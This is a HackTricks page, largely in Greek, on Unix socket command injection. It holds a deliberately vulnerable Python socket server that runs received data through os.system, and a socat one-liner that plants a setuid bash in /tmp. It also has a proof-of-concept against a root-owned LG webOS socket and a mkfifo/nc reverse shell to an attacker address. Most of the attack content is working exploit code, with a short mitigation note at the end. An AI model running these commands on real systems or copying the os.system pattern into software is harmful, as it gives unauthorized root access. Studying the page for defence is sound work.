# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

Στο παρακάτω παράδειγμα δημιουργείται ένας **unix socket** (`/tmp/socket_test.s`) και ό,τι **λαμβάνεται** θα **εκτελείται** από `os.system`. Ξέρω ότι δεν θα βρείτε κάτι τέτοιο στην άγρια φύση, αλλά ο στόχος αυτού του παραδείγματος είναι να δείξει πώς μοιάζει κώδικας που χρησιμοποιεί unix sockets και πώς να χειριστείτε την είσοδο στην χειρότερη δυνατή περίπτωση.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Εκτέλεσε** τον κώδικα χρησιμοποιώντας python: `python s.py` και **έλεγξε πώς ακούει το socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Μελέτη περίπτωσης: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Some privileged daemons expose a root-owned UNIX socket that accepts untrusted input and couples privileged actions to thread-IDs and signals. If the protocol lets an unprivileged client influence which native thread is targeted, you may be able to trigger a privileged code path and escalate.

Observed pattern:
- Συνδεθείτε σε έναν root-owned socket (e.g., /tmp/remotelogger).
- Δημιουργήστε ένα thread και αποκτήστε το native thread id (TID).
- Στείλτε το TID (packed) μαζί με padding ως αίτημα; λάβετε ένα acknowledgement.
- Deliver a specific signal to that TID to trigger the privileged behaviour.

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Για να το μετατρέψετε σε root shell, μπορεί να χρησιμοποιηθεί ένα απλό named-pipe + nc pattern:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Σημειώσεις:
- Αυτή η κατηγορία σφαλμάτων προκύπτει από την εμπιστοσύνη σε τιμές που προέρχονται από μη προνομιακή κατάσταση πελάτη (TIDs) και τη δέσμευσή τους σε privileged signal handlers ή λογική.
- Ενισχύστε την ασφάλεια επιβάλλοντας έλεγχο διαπιστευτηρίων στο socket, επικυρώνοντας τις μορφές μηνυμάτων και αποσυνδέοντας privileged operations από εξωτερικά παρεχόμενα thread identifiers.

## Αναφορές

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
